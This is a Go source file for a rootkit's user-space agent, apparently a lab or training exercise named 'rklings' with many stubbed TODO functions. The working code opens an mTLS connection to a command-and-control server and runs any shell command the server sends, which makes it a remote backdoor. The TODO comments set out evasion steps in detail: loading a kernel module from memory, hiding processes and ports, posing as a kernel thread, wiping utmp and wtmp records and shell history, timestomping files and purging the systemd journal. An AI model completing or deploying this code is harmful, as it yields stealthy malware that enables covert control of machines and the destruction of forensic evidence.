package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"crypto/x509"
	_ "embed"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"strings"
	"unsafe"

	"golang.org/x/sys/unix"
)

//go:embed certs/ca.crt
var caCert []byte

//go:embed certs/agent.crt
var agentCert []byte

//go:embed certs/agent.key
var agentKey []byte

//go:embed rklings.ko
var koBytes []byte

const serverAddr = "10.0.2.2:443"

// utmpRecordSize is the fixed size of a utmp record on Linux amd64.
const utmpRecordSize = 384
const utmpUserOffset = 44
const utmpUserLen = 256

func main() {
	conn := dial()
	defer conn.Close()

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.SplitN(line, " ", 2)
		cmd := parts[0]
		arg := ""
		if len(parts) > 1 {
			arg = parts[1]
		}

		switch cmd {
		case "PING":
			fmt.Fprintln(conn, "PONG")
		case "DEPLOY":
			err := deploy()
			if err != nil {
				fmt.Fprintf(conn, "ERR %v\n", err)
			} else {
				fmt.Fprintln(conn, "OK")
			}
		case "SHELL":
			handleShell(conn, arg)
		case "STATUS":
			fmt.Fprintf(conn, "PID=%d UID=%d\n", os.Getpid(), os.Getuid())
		default:
			fmt.Fprintf(conn, "ERR unknown: %s\n", cmd)
		}
	}
}

// dial establishes an mTLS connection to the server.
func dial() *tls.Conn {
	cert, err := tls.X509KeyPair(agentCert, agentKey)
	if err != nil {
		log.Fatalf("load agent cert: %v", err)
	}

	pool := x509.NewCertPool()
	pool.AppendCertsFromPEM(caCert)

	conn, err := tls.Dial("tcp", serverAddr, &tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:      pool,
		MinVersion:   tls.VersionTLS13,
	})
	if err != nil {
		log.Fatalf("dial: %v", err)
	}
	return conn
}

// deploy runs the full ghost sequence: load, hide, masquerade, scrub.
func deploy() error {
	// TODO: escalate to root (mkdir rklings.e)
	// TODO: loadModuleFromMemory(koBytes)
	// TODO: hideModule (mkdir rklings.h.m)
	// TODO: reexecFromMemory (only if not already running from memfd)
	// TODO: masquerade as [kworker/0:1]
	// TODO: hideAll (PID, port)
	// TODO: scrubAll (utmp, history, timestamps, journal, env)
	return nil
}

// loadModuleFromMemory loads a .ko from memory using memfd + finit_module.
func loadModuleFromMemory(ko []byte) error {
	// TODO: unix.MemfdCreate with MFD_CLOEXEC
	// TODO: write ko bytes to the memfd
	// TODO: unix.FinitModule to load from the fd
	// TODO: close the fd
	return nil
}

// reexecFromMemory re-executes this binary from a memfd.
// The original file on disk can be deleted before exec.
func reexecFromMemory() error {
	// TODO: read own binary with os.ReadFile("/proc/self/exe")
	// TODO: unix.MemfdCreate WITHOUT MFD_CLOEXEC
	// TODO: write self bytes to the memfd
	// TODO: unix.Exec /proc/self/fd/N with current args and env
	return nil
}

// masquerade sets the process name to look like a kernel thread
// and disables core dumps.
func masquerade() error {
	// TODO: prctl PR_SET_NAME to "[kworker/0:1]" (13 chars, fits TASK_COMM_LEN=16)
	// TODO: prctl PR_SET_DUMPABLE to 0
	// TODO: setrlimit RLIMIT_CORE to {0, 0}
	return nil
}

// hideAll hides the module, this process, and the server port via mkdir.
func hideAll() error {
	// TODO: mkdir rklings.h.m (hide module)
	// TODO: mkdir rklings.h.i.<pid> (hide this process)
	// TODO: mkdir rklings.h.p.443 (hide server port)
	return nil
}

// scrubAll removes all forensic traces.
func scrubAll() error {
	// TODO: scrubUtmp for current username
	// TODO: clearHistory
	// TODO: timestomp any files we touched (use /etc/hostname as reference)
	// TODO: tamperJournal
	// TODO: os.Clearenv
	return nil
}

// scrubUtmp removes login records for username from utmp and wtmp.
func scrubUtmp(username string) error {
	files := []string{"/var/run/utmp", "/var/log/wtmp"}
	_ = files
	_ = username
	// TODO: open each file O_RDWR, walk in utmpRecordSize chunks,
	//       zero records where ut_user matches username
	return nil
}

// clearHistory truncates shell history files.
func clearHistory() error {
	// TODO: truncate ~/.bash_history, ~/.zsh_history, /root/.bash_history
	return nil
}

// timestomp copies mtime from reference to target.
func timestomp(target, reference string) error {
	// TODO: os.Stat reference, os.Chtimes target
	return nil
}

// tamperJournal vacuums the systemd journal.
func tamperJournal() error {
	// TODO: journalctl --vacuum-time=1s
	// TODO: systemctl kill --signal=SIGUSR2 systemd-journald
	return nil
}

// handleShell executes a command and sends output terminated by ".".
func handleShell(conn *tls.Conn, cmd string) {
	out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
	if err != nil {
		fmt.Fprintf(conn, "ERR %v\n", err)
		return
	}
	fmt.Fprint(conn, string(out))
	fmt.Fprintln(conn, ".")
}

// extractUser reads ut_user from a utmp record.
func extractUser(record []byte) string {
	if len(record) < utmpUserOffset+utmpUserLen {
		return ""
	}
	raw := record[utmpUserOffset : utmpUserOffset+utmpUserLen]
	end := bytes.IndexByte(raw, 0)
	if end < 0 {
		end = utmpUserLen
	}
	return string(raw[:end])
}

// Ensure imports compile.
var _ = io.ReadFull
var _ = unsafe.Pointer(nil)
var _ = unix.MemfdCreate
